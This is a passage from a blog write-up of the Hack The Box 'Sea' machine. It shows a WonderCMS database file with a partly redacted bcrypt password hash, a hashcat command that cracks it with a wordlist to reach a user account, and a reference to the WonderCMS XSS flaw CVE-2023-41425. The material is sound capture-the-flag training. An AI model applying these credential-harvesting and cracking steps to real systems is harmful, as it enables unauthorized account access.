<a href="/assets/img/posts/htb/sea/JRjhq1Wd45.png" class="popup img-link  shimmer"><img src="/assets/img/posts/htb/sea/JRjhq1Wd45.png" alt="Reverse shell" loading="lazy"></a></p>

<p>After thoroughly going on checking out all directories I found an interesting file in <code class="language-plaintext highlighter-rouge">/var/www/sea/data/database.js</code>:</p>

<div class="language-javascript nolineno highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
</pre></td><td class="rouge-code"><pre><span class="c1">//$ cat database.js</span>
<span class="p">{</span>
    <span class="dl">"</span><span class="s2">config</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
        <span class="dl">"</span><span class="s2">siteTitle</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Sea</span><span class="dl">"</span><span class="p">,</span>
        <span class="dl">"</span><span class="s2">theme</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">bike</span><span class="dl">"</span><span class="p">,</span>
        <span class="dl">"</span><span class="s2">defaultPage</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">home</span><span class="dl">"</span><span class="p">,</span>
        <span class="dl">"</span><span class="s2">login</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">loginURL</span><span class="dl">"</span><span class="p">,</span>
        <span class="dl">"</span><span class="s2">forceLogout</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
        <span class="dl">"</span><span class="s2">forceHttps</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
        <span class="dl">"</span><span class="s2">saveChangesPopup</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
        <span class="dl">"</span><span class="s2">password</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">$2y$10$[....]/PjDnXm4q</span><span class="dl">"</span><span class="p">,</span>
        <span class="dl">"</span><span class="s2">lastLogins</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
            <span class="dl">"</span><span class="s2">2024</span><span class="se">\</span><span class="s2">/08</span><span class="se">\</span><span class="s2">/17 06:12:20</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">127.0.0.1</span><span class="dl">"</span><span class="p">,</span>
            <span class="dl">"</span><span class="s2">2024</span><span class="se">\</span><span class="s2">/08</span><span class="se">\</span><span class="s2">/17 06:09:50</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">127.0.0.1</span><span class="dl">"</span><span class="p">,</span>
            <span class="dl">"</span><span class="s2">2024</span><span class="se">\</span><span class="s2">/08</span><span class="se">\</span><span class="s2">/17 06:05:20</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">127.0.0.1</span><span class="dl">"</span><span class="p">,</span>
            <span class="dl">"</span><span class="s2">2024</span><span class="se">\</span><span class="s2">/08</span><span class="se">\</span><span class="s2">/17 06:01:50</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">127.0.0.1</span><span class="dl">"</span><span class="p">,</span>
            <span class="dl">"</span><span class="s2">2024</span><span class="se">\</span><span class="s2">/08</span><span class="se">\</span><span class="s2">/17 06:00:49</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">127.0.0.1</span><span class="dl">"</span>
        <span class="p">},</span>
        <span class="dl">"</span><span class="s2">lastModulesSync</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">2024</span><span class="se">\</span><span class="s2">/08</span><span class="se">\</span><span class="s2">/17</span><span class="dl">"</span><span class="p">,</span>
        <span class="dl">"</span><span class="s2">customModules</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
            <span class="dl">"</span><span class="s2">themes</span><span class="dl">"</span><span class="p">:</span> <span class="p">{},</span>
            <span class="dl">"</span><span class="s2">plugins</span><span class="dl">"</span><span class="p">:</span> <span class="p">{}</span>
        <span class="p">},</span>
        <span class="dl">"</span><span class="s2">menuItems</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
            <span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
                <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Home</span><span class="dl">"</span><span class="p">,</span>
                <span class="dl">"</span><span class="s2">slug</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">home</span><span class="dl">"</span><span class="p">,</span>
                <span class="dl">"</span><span class="s2">visibility</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">show</span><span class="dl">"</span><span class="p">,</span>
                <span class="dl">"</span><span class="s2">subpages</span><span class="dl">"</span><span class="p">:</span> <span class="p">{}</span>
            <span class="p">},</span>
            <span class="dl">"</span><span class="s2">1</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
                <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">How to participate</span><span class="dl">"</span><span class="p">,</span>
                <span class="dl">"</span><span class="s2">slug</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">how-to-participate</span><span class="dl">"</span><span class="p">,</span>
                <span class="dl">"</span><span class="s2">visibility</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">show</span><span class="dl">"</span><span class="p">,</span>
                <span class="dl">"</span><span class="s2">subpages</span><span class="dl">"</span><span class="p">:</span> <span class="p">{}</span>
            <span class="p">}</span>
        <span class="p">},</span>
        <span class="dl">"</span><span class="s2">logoutToLoginScreen</span><span class="dl">"</span><span class="p">:</span> <span class="p">{}</span>
    <span class="p">},</span>
    <span class="dl">"</span><span class="s2">pages</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
        <span class="dl">"</span><span class="s2">404</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
            <span class="dl">"</span><span class="s2">title</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">404</span><span class="dl">"</span><span class="p">,</span>
            <span class="dl">"</span><span class="s2">keywords</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">404</span><span class="dl">"</span><span class="p">,</span>
            <span class="dl">"</span><span class="s2">description</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">404</span><span class="dl">"</span><span class="p">,</span>
            <span class="dl">"</span><span class="s2">content</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">&lt;center&gt;&lt;h1&gt;404 - Page not found&lt;</span><span class="se">\</span><span class="s2">/h1&gt;&lt;</span><span class="se">\</span><span class="s2">/center&gt;</span><span class="dl">"</span><span class="p">,</span>
            <span class="dl">"</span><span class="s2">subpages</span><span class="dl">"</span><span class="p">:</span> <span class="p">{}</span>
        <span class="p">},</span>
        <span class="dl">"</span><span class="s2">home</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
            <span class="dl">"</span><span class="s2">title</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Home</span><span class="dl">"</span><span class="p">,</span>
            <span class="dl">"</span><span class="s2">keywords</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Enter, page, keywords, for, search, engines</span><span class="dl">"</span><span class="p">,</span>
            <span class="dl">"</span><span class="s2">description</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">A page description is also good for search engines.</span><span class="dl">"</span><span class="p">,</span>
            <span class="dl">"</span><span class="s2">content</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">&lt;h1&gt;Welcome to Sea&lt;</span><span class="se">\</span><span class="s2">/h1&gt;</span><span class="se">\n\n</span><span class="s2">&lt;p&gt;Hello! Join us for an exciting night biking adventure! We are a new company that organizes bike competitions during the night and we offer prizes for the first three places! The most important thing is to have fun, join us now!&lt;</span><span class="se">\</span><span class="s2">/p&gt;</span><span class="dl">"</span><span class="p">,</span>
            <span class="dl">"</span><span class="s2">subpages</span><span class="dl">"</span><span class="p">:</span> <span class="p">{}</span>
        <span class="p">},</span>
        <span class="dl">"</span><span class="s2">how-to-participate</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
            <span class="dl">"</span><span class="s2">title</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">How to</span><span class="dl">"</span><span class="p">,</span>
            <span class="dl">"</span><span class="s2">keywords</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Enter, keywords, for, this page</span><span class="dl">"</span><span class="p">,</span>
            <span class="dl">"</span><span class="s2">description</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">A page description is also good for search engines.</span><span class="dl">"</span><span class="p">,</span>
            <span class="dl">"</span><span class="s2">content</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">&lt;h1&gt;How can I participate?&lt;</span><span class="se">\</span><span class="s2">/h1&gt;</span><span class="se">\n</span><span class="s2">&lt;p&gt;To participate, you only need to send your data as a participant through &lt;a href=</span><span class="se">\"</span><span class="s2">http:</span><span class="se">\</span><span class="s2">/</span><span class="se">\</span><span class="s2">/sea.htb</span><span class="se">\</span><span class="s2">/contact.php</span><span class="se">\"</span><span class="s2">&gt;contact&lt;</span><span class="se">\</span><span class="s2">/a&gt;. Simply enter your name, email, age and country. In addition, you can optionally add your website related to your passion for night racing.&lt;</span><span class="se">\</span><span class="s2">/p&gt;</span><span class="dl">"</span><span class="p">,</span>
            <span class="dl">"</span><span class="s2">subpages</span><span class="dl">"</span><span class="p">:</span> <span class="p">{}</span>
        <span class="p">}</span>
    <span class="p">},</span>
    <span class="dl">"</span><span class="s2">blocks</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
        <span class="dl">"</span><span class="s2">subside</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
            <span class="dl">"</span><span class="s2">content</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">&lt;h2&gt;About&lt;</span><span class="se">\</span><span class="s2">/h2&gt;</span><span class="se">\n\n</span><span class="s2">&lt;br&gt;</span><span class="se">\n</span><span class="s2">&lt;p&gt;We are a company dedicated to organizing races on an international level. Our main focus is to ensure that our competitors enjoy an exciting night out on the bike while participating in our events.&lt;</span><span class="se">\</span><span class="s2">/p&gt;</span><span class="dl">"</span>
        <span class="p">},</span>
        <span class="dl">"</span><span class="s2">footer</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
            <span class="dl">"</span><span class="s2">content</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">©2024 Sea</span><span class="dl">"</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="gain-access-user-amay"><span class="me-2">Gain access user amay</span><a href="#gain-access-user-amay" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>I use hashcat to crack this password with rockyou wordlist:</p>
<div class="language-bash nolineno highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>hashcat <span class="nt">-a</span> 0  <span class="nt">-m</span> 3200 password rockyou.txt

<span class="nv">$2y$10$i</span><span class="o">[</span>...]Xm4q:my<span class="k">*************</span>ce

</pre></td></tr></tbody></table></code></div></div>

<p>Let’s get the user flag.</p>

<p><a href="/assets/img/posts/htb/sea/YStSJCYtMY.png" class="popup img-link  shimmer"><img src="/assets/img/posts/htb/sea/YStSJCYtMY.png" alt="user flag" loading="lazy"></a></p>

<h2 id="reference"><span class="me-2">Reference</span><a href="#reference" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<ul>
  <li>Cross Site Scripting vulnerability in Wonder CMS v.3.2.0 thru v.3.4.2 <a href="https://github.com/prodigiousMind/CVE-2023-41425">CVE-2023-41425</a></li>
  <li><a href="https://shivamaharjan.medium.com/the-why-and-how-of-cve-2023-41425-wondercms-vulnerability-7ebffbff37d2">WonderCMS Vulnerability explain</a></li>
</ul>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/hack-the-box/">Hack The Box</a>,
          <a href="/categories/machines/">Machines</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/htb/"
            class="post-tag no-text-decoration"
          >htb</a>
        
          <a
            href="/tags/machine/"
            class="post-tag no-text-decoration"
          >machine</a>
        
          <a
            href="/tags/web/"
            class="post-tag no-text-decoration"
          >web</a>
        
          <a
            href="/tags/sea/"
            class="post-tag no-text-decoration"
          >sea</a>
        
          <a
            href="/tags/seasonvi/"
            class="post-tag no-text-decoration"
          >seasonvi</a>
        
          <a
            href="/tags/wondercms/"
            class="post-tag no-text-decoration"
          >wondercms</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=Sea%20-%20Hack%20The%20Box%20Machines%20-%20Natsu&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FSea-Hack-The-Box-Machine%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=Sea%20-%20Hack%20The%20Box%20Machines%20-%20Natsu&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FSea-Hack-The-Box-Machine%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FSea-Hack-The-Box-Machine%2F&text=Sea%20-%20Hack%20The%20Box%20Machines%20-%20Natsu" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          ⤷ <a href="/posts/Cicada-Hack-The-Box-Machine/">Cicada - Hack The Box Machines</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          ⤷ <a href="/posts/Resource-Hack-The-Box-Machine/">Resource - Hack The Box Machines</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          ⤷ <a href="/posts/Sea-Hack-The-Box-Machine/">Sea - Hack The Box Machines</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          ⤷ <a href="/posts/CrownJewel2-Hack-The-Box-Challenges/">CrownJewel 2 - Sherlocks</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          ⤷ <a href="/posts/Level-keygen-crackmesone/">Level Keygen - Crackmes One</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/htb/">htb</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/machine/">machine</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/c-c/">C/C++</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/crackmes/">Crackmes</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/gdb/">GDB</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ghidra/">Ghidra</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/linux/">Linux</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/reverse/">Reverse</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/seasonvi/">seasonvi</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/web/">web</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->














  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/Resource-Hack-The-Box-Machine/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1723100400"
  data-df="ll"
  
>
  Aug  8, 2024
</time>

              <h4 class="pt-0 my-2">Resource - Hack The Box Machines</h4>
              <div class="text-muted">
                <p>
                  





                  Reconnaisance


Resource HTB Season VI

Hello, everyone! 👋 Welcome back. This is the first machine challenge of Season VI and it has a medium difficulty level. As with many previous attempts to pwn...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/Cicada-Hack-The-Box-Machine/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1730275200"
  data-df="ll"
  
>
  Oct 30, 2024
</time>

              <h4 class="pt-0 my-2">Cicada - Hack The Box Machines</h4>
              <div class="text-muted">
                <p>
                  





                  Reconnaisance

Hello and welcome back to noob in cybersecurity and today I will show you the way that I solved the Cicada challenge on Hack The Box

To start tackling the Cicada challenge on Hack T...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/CrownJewel2-Hack-The-Box-Challenges/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1726297200"
  data-df="ll"
  
>
  Sep 14, 2024
</time>

              <h4 class="pt-0 my-2">CrownJewel 2 - Sherlocks</h4>
              <div class="text-muted">
                <p>
                  





                  Scenario: Forela’s Domain environment is pure chaos. Just got another alert from the Domain controller of NTDS.dit database being exfiltrated. Just one day prior you responded to an alert on the sa...
                </p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/Resource-Hack-The-Box-Machine/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>Resource - Hack The Box Machines</p>
    </a>
  

  
    <a
      href="/posts/Reverse-Shell-with-C++/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>Simple Reverse Shell with C++</p>
    </a>
  
</nav>

            
              
              <!--  The comments switcher -->


            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>
    ©
    <time>2024</time>
    <a href="https://twitter.com/username">Natsu.2013</a>.
    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <!-- Custom Link to Digital Den -->
  <p>Contact: [<a href="https://github.com/natsu2013" target="_blank" rel="noopener">natsu2013</a>]</p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/htb/">htb</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/machine/">machine</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/c-c/">C/C++</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/crackmes/">Crackmes</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/gdb/">GDB</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ghidra/">Ghidra</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/linux/">Linux</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/reverse/">Reverse</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/seasonvi/">seasonvi</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/web/">web</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->




  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.25.0/dist/tocbot.min.js"></script>






<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
